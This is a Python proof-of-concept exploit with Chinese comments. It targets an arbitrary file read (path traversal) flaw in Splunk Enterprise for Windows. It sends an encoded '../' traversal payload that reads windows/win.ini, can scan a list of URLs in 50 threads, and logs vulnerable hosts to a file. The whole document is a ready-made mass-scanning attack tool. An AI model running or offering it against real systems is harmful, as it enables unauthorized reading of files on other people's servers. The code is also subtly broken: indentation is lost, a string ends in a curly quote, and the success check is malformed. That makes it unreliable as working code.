#Splunk Enterprise for Windows 任意文件读取漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()

#定义横幅
def banner():
banner = """
__.   .      .    .___    ,                      ._        .  .      .            .__ .__.._..__ .__.._.
(__ ._ |. .._ ;_/  [__ ._ -+- _ ._.._ ._.* __ _   |, _ ._.  |  |*._  _| _ .    , __[__)[__] | [__)[__] |
.__)[_)|(_|[ )| \  [___[ ) | (/,[  [_)[  |_) (/,  | (_)[    |/\||[ )(_](_) \/\/ _) [__)|  |_|_[__)|  |_|_
|                              |
"""
print(banner)


#定义主函数
def main():
#调用横幅
banner()
#argparse模块处理命令行参数
parser = argparse.ArgumentParser(description="Splunk Enterprise for Windows任意文件读取漏洞")
parser.add_argument('-u','--url',dest='url',type=str,help='input url')
parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
args = parser.parse_args()
#如果用户输入url而不是file时：
if args.url and not args.file:
poc(args.url)
#如果用户输入file而不是url时：
elif args.file and not args.url:
url_list=[]
with open(args.file,mode='r',encoding='utf-8') as fr:
for i in fr.readlines():
url_list.append(i.strip().replace('\n',''))
# print(url_list)
#设置多线程
mp = Pool(50)
mp.map(poc,url_list)
mp.close()
mp.join()
#如果用户输入的既不是url也不是file时：
else:
print(f"Usag:\n\t python3 {sys.argv[0]} -h")

#定义poc
def poc(target):
ses = requests.Session()
payload = "/en-US/modules/messaging/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/C:%2e%2e/windows/win.ini“
url = target+payload
headers = {
"Content-Type":"application/x-www-form-urlencoded",
"Connection": "close"
}
proxies = {
'http':'http://127.0.0.1:8080',
'https':'http://127.0.0.1:8080'
}

#请求网页
# print(payload)
req = requests.Request('GET', url)
prepared = ses.prepare_request(req)
prepared.url = url
re = ses.send(prepared,verify=False,proxies=proxies)
# re = ses.send(url=prepared,headers=headers,verify=False,timeout=4,proxies=proxies)
print(re.text)
try:
if re.status_code == 200  in re.text:
print(f'[+++]该{target}存在Splunk Enterprise for Windows任意文件读取漏洞')
with open('result.txt',mode='a',encoding='utf-8')as ft:
ft.write(target+'\n')
else:
pass
except:
print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
main()
